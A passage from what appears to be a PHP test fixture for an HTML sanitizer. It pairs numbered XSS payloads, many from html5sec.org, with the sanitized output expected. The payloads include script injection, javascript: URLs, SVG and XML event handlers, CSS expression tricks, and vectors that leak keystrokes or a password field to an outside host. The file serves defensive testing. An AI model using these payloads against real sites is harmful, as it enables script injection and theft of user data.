        'payload'  => "<div id=\"75\"><script<{alert(75)}/></script </>//[\"'`-->]]>]</div>",
        'expected' => '<div id="75">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"76\"><?xml-stylesheet type=\"text/css\"?><!DOCTYPE x SYSTEM \"test.dtd\"><x>&x;</x>//[\"'`-->]]>]</div>",
        'expected' => '<div id="76">&gt;?xml-stylesheet type=&quot;text/css&quot;?&lt;',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"77\"><?xml-stylesheet type=\"text/css\"?><root style=\"x:expression(alert(77))\"/>//[\"'`-->]]>]</div>",
        'expected' => '<div id="77">&gt;?xml-stylesheet type=&quot;text/css&quot;?&lt;',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"78\"><?xml-stylesheet type=\"text/xsl\" href=\"#\"?><img xmlns=\"x-schema:test.xdr\"/>//[\"'`-->]]>]</div>",
        'expected' => '<div id="78">&gt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;#&quot;?&lt;<img />',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"79\"><object allowscriptaccess=\"always\" data=\"x\"></object>//[\"'`-->]]>]</div>",
        'expected' => '<div id="79"><object data="x"></object>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"80\"><style>*{x:\uFF45\uFF58\uFF50\uFF52\uFF45\uFF53\uFF53\uFF49\uFF4F\uFF4E(alert(80))}</style>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"80\">*{x:\uFF45\uFF58\uFF50\uFF52\uFF45\uFF53\uFF53\uFF49\uFF4F\uFF4E(alert(80))}",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"81\"><x xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:actuate=\"onLoad\" xlink:href=\"javascript:alert(81)\" xlink:type=\"simple\"/>//[\"'`-->]]>]</div>",
        'expected' => '<div id="81">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"82\"><?xml-stylesheet type=\"text/css\" href=\"data:,*%7bx:expression(write(2));%7d\"?>//[\"'`-->]]>]</div><div id=\"83\"><x:template xmlns:x=\"http://www.wapforum.org/2001/wml\"  x:ontimer=\"$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript\$x:alert(83)\"><x:timer value=\"1\"/></x:template>//[\"'`-->]]>]</div>",
        'expected' => '<div id="82">&gt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;data:,*%7bx:expression(write(2));%7d&quot;?&lt;',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"84\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"javascript:alert(84)//#x\"/>//[\"'`-->]]>]</div>",
        'expected' => '<div id="84">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"85\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"test.evt#x\"/>//[\"'`-->]]>]</div>",
        'expected' => '<div id="85">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"86\"><body oninput=alert(86)><input autofocus>//[\"'`-->]]>]</div><div id=\"87\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(87)\"><rect width=\"1000\" height=\"1000\" fill=\"white\"/></a>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => '<div id="86">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"89\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<set attributeName=\"onmouseover\" to=\"alert(89)\"/>\n<animate attributeName=\"onunload\" to=\"alert(89)\"/>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"89\">\n\n\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"90\"><!-- Up to Opera 10.63 -->\n<div style=content:url(test2.svg)></div>\n\n<!-- Up to Opera 11.64 - see link below -->\n\n<!-- Up to Opera 12.x -->\n<div style=\"background:url(test5.svg)\">PRESS ENTER</div>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"90\">\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"91\">[A]\n<? foo=\"><script>alert(91)</script>\">\n<! foo=\"><script>alert(91)</script>\">\n</ foo=\"><script>alert(91)</script>\">\n[B]\n<? foo=\"><x foo='?><script>alert(91)</script>'>\">\n[C]\n<! foo=\"[[[x]]\"><x foo=\"]foo><script>alert(91)</script>\">\n[D]\n<% foo><x foo=\"%><script>alert(91)</script>\">//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"91\">[A]\n&gt;? foo=&quot;&gt;alert(91)&quot;&gt;\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"92\"><div style=\"background:url(http://foo.f/f oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>",
        'expected' => '<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"93\"><div style=\"list-style:url(http://foo.f)\u0010url(javascript:alert(93));\">X</div>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"93\"><div style=\"list-style:url(http://foo.f)\u0010url(javascript:alert(93));\">X</div>",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(94)</handler>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"94\">\nalert(94)\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<feImage>\n<set attributeName=\"xlink:href\" to=\"data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D\"/>\n</feImage>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"95\">\n\n\n\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"96\"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[\"'`-->]]>]</div>",
        'expected' => '<div id="96">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"97\"><!-- IE 5-9 -->\n<div id=d><x xmlns=\"><iframe onload=alert(97)\"></div>\n<script>d.innerHTML+='';</script>\n<!-- IE 10 in IE5-9 Standards mode -->\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"97\">\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"98\"><div id=d><div style=\"font-family:'sans\u0017\u0002F\u0002A\u0012\u0002A\u0002F\u0003B color\u0003Ared\u0003B'\">X</div></div>\n<script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>//[\"'`-->]]>]</div>",
        'expected' => '<div id="98">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"99\">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\red/*)} /* IE 6-7 Standards mode */\n\n</style>//[\"'`-->]]>]</div>",
        'expected' => '<div id="99">XXX',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"100\"><img[a][b]src=x[d]onerror[c]=[e]\"alert(100)\">//[\"'`-->]]>]</div>",
        'expected' => '<div id="100">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"101\"><a href=\"[a]java[b]script[c]:alert(101)\">XXX</a>//[\"'`-->]]>]</div>",
        'expected' => '<div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"102\"><img src=\"x` `<script>alert(102)</script>\"` `>//[\"'`-->]]>]</div>",
        'expected' => '<div id="102">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"103\"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[\"'`-->]]>]</div><div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\">\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar\"/>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"103\">history.pushState(0,0,'/i/am/somewhere_else');",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"105\"><iframe src=\"data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03\"></iframe>//[\"'`-->]]>]</div>",
        'expected' => '<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"106\"><img src onerror /\" '\"= alt=alert(106)//\">//[\"'`-->]]>]</div>",
        'expected' => '<div id="106">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"107\"><title onpropertychange=alert(107)></title><title title=></title>//[\"'`-->]]>]</div>",
        'expected' => '<div id="107">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"108\"><!-- IE 5-8 standards mode -->\n<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=xx onerror=alert(108)></a>\">\n<!-- IE 5-9 standards mode -->\n<!a foo=x=`y><img alt=\"`><img src=xx onerror=alert(2)//\">\n<?a foo=x=`y><img alt=\"`><img src=xx onerror=alert(3)//\">//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"108\">\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"/></a>\n<rect  fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"/>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"109\">\n<a id=\"x\"></a>\n\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M0,0\" style=\"marker-start:url(test4.svg#a)\"/>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"110\">\n\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"111\"><div style=\"background:url(/f#[a]oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>",
        'expected' => '<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"112\"><div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div><div id=\"113\"><div id=\"x\">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//[\"'`-->]]>]</div>",
        'expected' => '<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"114\"><x style=\"background:url('x[a];color:red;/*')\">XXX</x>//[\"'`-->]]>]</div><div id=\"115\"><!--[if]><script>alert(115)</script -->\n<!--[if<img src=x onerror=alert(2)//]> -->//[\"'`-->]]>]</div>",
        'expected' => '<div id="114">XXX',
    ],
    [
        'title'    => 'XML',
        'payload'  => "<div id=\"116\"><div id=\"x\">x</div>\n<xml:namespace prefix=\"t\">\n<import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"<img\u000Bsrc=x\u000Bonerror\u000B=alert(116)>\">//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"116\"><div id=\"x\">x</div>\n\n\n",
    ],
    [
        'title'    => 'iframe',
        'payload'  => "<div id=\"117\"><a href=\"http://attacker.org\">\n    <iframe src=\"http://example.org/\"></iframe>\n</a>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"117\"><a href=\"http://attacker.org\">\n    <iframe src=\"http://example.org/\"></iframe>\n</a>",
    ],
    [
        'title'    => 'Drag & drop',
        'payload'  => "<div id=\"118\"><div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/plain','malicious code');\">\n    <h1>Drop me</h1>\n</div>\n<iframe src=\"http://www.example.org/dropHere.html\"></iframe>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"118\"><div draggable=\"true\">\n    <h1>Drop me</h1>\n</div>\n<iframe src=\"http://www.example.org/dropHere.html\"></iframe>",
    ],
    [
        'title'    => 'view-source',
        'payload'  => '<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>',
        'expected' => '<div id="119"><iframe src="#" frameborder="0" style="width:400px;height:180px"></iframe>',
    ],
    [
        'title'    => '',
        'payload'  => "<textarea type=\"text\" cols=\"50\" rows=\"10\"></textarea>//[\"'`-->]]>]</div>",
        'expected' => '<textarea cols="50" rows="10"></textarea>',
    ],
    [
        'title'    => 'window.open',
        'payload'  => "<div id=\"120\"><script>\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open('popup.html','spam'+i,'width=50,height=50');\n    }\n}\n</script>\n<body>\n<a href=\"#\" onclick=\"makePopups()\">Spam</a>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"120\">\nfunction makePopups(){\n    for (i=1;i",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"121\"><html xmlns=\"http://www.w3.org/1999/xhtml\"\nxmlns:svg=\"http://www.w3.org/2000/svg\">\n<body style=\"background:gray\">\n<iframe src=\"http://example.com/\" style=\"width:800px; height:350px; border:none; mask: url(#maskForClickjacking);\"/>\n<svg:svg>\n<svg:mask id=\"maskForClickjacking\" maskUnits=\"objectBoundingBox\" maskContentUnits=\"objectBoundingBox\">\n    <svg:rect x=\"0.0\" y=\"0.0\" width=\"0.373\" height=\"0.3\" fill=\"white\"/>\n    <svg:circle cx=\"0.45\" cy=\"0.7\" r=\"0.075\" fill=\"white\"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"121\">\n\n<iframe src=\"http://example.com/\" style=\"width:800px; height:350px; border:none; mask: url(#maskForClickjacking);\"></iframe>\n\n\n    \n    \n\n\n\n",
    ],
    [
        'title'    => 'iframe (sandboxed)',
        'payload'  => "<div id=\"122\"><iframe sandbox=\"allow-same-origin allow-forms allow-scripts\" src=\"http://example.org/\"></iframe>//[\"'`-->]]>]</div>",
        'expected' => '<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"123\"><span class=foo>Some text</span>\n<a class=bar href=\"http://www.example.org\">www.example.org</a>\n<script src=\"http://code.jquery.com/jquery-1.4.4.js\"></script>\n<script>\n$(\"span.foo\").click(function() {\nalert('foo');\n$(\"a.bar\").click();\n});\n$(\"a.bar\").click(function() {\nalert('bar');\nlocation=\"http://html5sec.org\";\n});\n</script>//[\"'`-->]]>]</div>",
        'expected' => '<div id="123">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"124\"><script src=\"/example.com\foo.js\"></script> // Safari 5.0, Chrome 9, 10\n<script src=\"\\example.com\foo.js\"></script> // Safari 5.0//[\"'`-->]]>]</div>",
        'expected' => '<div id="124">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"125\"><?xml version=\"1.0\"?><?xml-stylesheet type=\"text/xml\" href=\"#stylesheet\"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns=\"http://www.w3.org/2000/svg\">    <xsl:stylesheet id=\"stylesheet\" version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">        <xsl:template match=\"/\">            <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(125)\"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill=\"red\" r=\"40\"></circle></svg>//[\"'`-->]]>]</div>",
        'expected' => '<div id="125">&gt;?xml version=&quot;1.0&quot;?&lt;&gt;?xml-stylesheet type=&quot;text/xml&quot; href=&quot;#stylesheet&quot;?&lt;',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"126\"><object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object>\n<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"alert(126)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"126\"><object id=\"x\" classid=\"#\"></object>\n<object classid=\"#\" style=\"behavior:url(#x);\">",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"127\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"x\">\n<listener event=\"load\" handler=\"#y\" xmlns=\"http://www.w3.org/2001/xml-events\" observer=\"x\"/>\n<handler id=\"y\">alert(127)</handler>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"127\">\n\nalert(127)\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"128\"><svg><style><img/src=x onerror=alert(128)// </b>//[\"'`-->]]>]</div>",
        'expected' => '<div id="128">',
    ],
    [
        'title'    => 'Inline SVG (data-uri)',
        'payload'  => "<div id=\"129\"><svg><image style='filter:url(\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>\")'>\n<!--\nSame effect with\n<image filter='...'>\n-->\n</svg>//[\"'`-->]]>]</div>",
        'expected' => '<div id="129">',
    ],
    [
        'title'    => 'MathML',
        'payload'  => "<div id=\"130\"><math href=\"javascript:alert(130)\">CLICKME</math>\n<math>\n<!-- up to FF 13 -->\n<maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(2)\">CLICKME</maction>\n\n<!-- FF 14+ -->\n<maction actiontype=\"statusline\" xlink:href=\"javascript:alert(3)\">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"130\">CLICKME\n\n\nCLICKME\n\n\nCLICKMEhttp://http://google.com\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>",
        'expected' => '<div id="132">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"133\"><!-- `<img/src=xxx onerror=alert(133)//--!>//[\"'`-->]]>]</div>",
        'expected' => '<div id="133">',
    ],
    [
        'title'    => 'XMP',
        'payload'  => "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"134\">\n",
    ],
    [
        'title'    => 'SVG',
        'payload'  => "<div id=\"135\"><?xml-stylesheet type=\"text/xsl\" href=\"#\" ?>\n<stylesheet xmlns=\"http://www.w3.org/TR/WD-xsl\">\n<template match=\"/\">\n<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>\n<if expr=\"new ActiveXObject('htmlfile').parentWindow.alert(2)\"></if>\n</template>\n</stylesheet>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"135\">&gt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;#&quot; ?&lt;\n\n<template>\nnew ActiveXObject('htmlfile').parentWindow.alert(135)\n\n</template>\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"136\"><form action=\"x\" method=\"post\">\n<input name=\"username\" value=\"admin\" />\n<input name=\"password\" type=\"password\" value=\"secret\" />\n<input name=\"injected\" value=\"injected\" dirname=\"password\" />\n<input type=\"submit\">\n</form>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"136\"><form action=\"x\" method=\"post\">\n<input name=\"username\" value=\"admin\" />\n<input name=\"password\" type=\"password\" value=\"secret\" />\n<input name=\"injected\" value=\"injected\" />\n<input type=\"submit\" />\n",
    ],
    [
        'title'    => 'SVG',
        'payload'  => "<div id=\"137\"><svg>\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"?\">\n<circle r=\"400\"></circle>\n<animate attributeName=\"xlink:href\" begin=\"0\" from=\"javascript:alert(137)\" to=\"&\" />\n</a>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"137\">\n<a>\n\n\n</a>",
    ],
    [
        'title'    => 'Removing name attr from img with id can crash Safari',
        'payload'  => '<img name="bar" id="foo">',
        'expected' => '<img name="bar" id="foo" />',
    ],
    [
        'title'    => 'DOM clobbering: submit',
        'payload'  => '<input name=submit>123',
        'expected' => '',
    ],
    [
        'title'    => 'DOM clobbering: acceptCharset',
        'payload'  => '<input name=acceptCharset>123',
        'expected' => '',
    ],
    [
        'title'    => 'Testing support for sizes and srcset',
        'payload'  => '<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">',
        'expected' => '<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w" />',
    ],
    [
        'title'    => "See #264 and Edge's weird attribute name errors",
        'payload'  => '<div &nbsp;=""></div>',
        'expected' => '',
    ],
];
